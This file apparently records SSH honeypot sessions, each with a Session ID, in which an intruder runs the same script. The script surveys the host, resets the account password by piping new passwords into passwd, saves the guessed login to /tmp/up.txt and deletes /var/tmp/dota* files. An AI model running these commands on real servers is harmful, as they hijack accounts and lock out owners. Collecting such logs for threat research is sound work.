+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin qwe123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 67697ebce308
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin@1234\ntsDybjvnIMQ2\ntsDybjvnIMQ2"|passwd|bash
+echo "admin@1234\ntsDybjvnIMQ2\ntsDybjvnIMQ2\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin@1234" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: bf8185c7812a
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "12345678\numsaw8m0OSCS\numsaw8m0OSCS"|passwd|bash
+echo "12345678\numsaw8m0OSCS\numsaw8m0OSCS\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 12345678" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 0e54fd8476e6
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "welcome\nH68xyKHG5yQl\nH68xyKHG5yQl"|passwd|bash
+echo "welcome\nH68xyKHG5yQl\nH68xyKHG5yQl\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin welcome" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: effb92058d37
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "P@ssw0rds\n8UFJpORS2866\n8UFJpORS2866"|passwd|bash
+echo "P@ssw0rds\n8UFJpORS2866\n8UFJpORS2866\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin P@ssw0rds" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 17d2a6717820
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123456789\nv3iU8W0DOkVZ\nv3iU8W0DOkVZ"|passwd|bash
+echo "123456789\nv3iU8W0DOkVZ\nv3iU8W0DOkVZ\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123456789" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: ef00535387a9
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "p@ssword\nawZzzZSld0aa\nawZzzZSld0aa"|passwd|bash
+echo "p@ssword\nawZzzZSld0aa\nawZzzZSld0aa\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin p@ssword" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 0c49b56b09e4
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "p@$$wOrd\n0aM7GknUclKn\n0aM7GknUclKn"|passwd|bash
+echo "p@$$wOrd\n0aM7GknUclKn\n0aM7GknUclKn\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin p@$$wOrd" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: d9a44d7f941d
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "nospam\nHPSl9oauFo7u\nHPSl9oauFo7u"|passwd|bash
+echo "nospam\nHPSl9oauFo7u\nHPSl9oauFo7u\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin nospam" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: b82f2a9569be
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "admin2020\nfneuyxUJs7tV\nfneuyxUJs7tV"|passwd|bash
+echo "admin2020\nfneuyxUJs7tV\nfneuyxUJs7tV\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin admin2020" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 72d102a72215
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "p@ssw0rd123\nLmUn1UiKsmmU\nLmUn1UiKsmmU"|passwd|bash
+echo "p@ssw0rd123\nLmUn1UiKsmmU\nLmUn1UiKsmmU\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin p@ssw0rd123" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 979d65f16367
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "P@ssw0rds\n0yXWC0e4QE7C\n0yXWC0e4QE7C"|passwd|bash
+echo "P@ssw0rds\n0yXWC0e4QE7C\n0yXWC0e4QE7C\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin P@ssw0rds" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: 85777865a20b
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "guest\n55We2XvF1zHf\n55We2XvF1zHf"|passwd|bash
+echo "guest\n55We2XvF1zHf\n55We2XvF1zHf\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin guest" > /tmp/up.txt
+rm -rf /var/tmp/dota*
+
+Session ID: d4dc06f58ff8
+cat /proc/cpuinfo | grep name | wc -l
+echo -e "123qwe\nmoLudl9xPLP7\nmoLudl9xPLP7"|passwd|bash
+echo "123qwe\nmoLudl9xPLP7\nmoLudl9xPLP7\n"|passwd
+echo "321" > /var/tmp/.var03522123
+rm -rf /var/tmp/.var03522123
+cat /var/tmp/.var03522123 | head -n 1
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9
+}'
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+ls -lh $(which ls)
+crontab -l
+w
+uname -m
+cat /proc/cpuinfo | grep model | grep name | wc -l
+top
+uname
+uname -a
+lscpu | grep Model
+echo "admin 123qwe" > /tmp/up.txt
+rm -rf /var/tmp/dota*
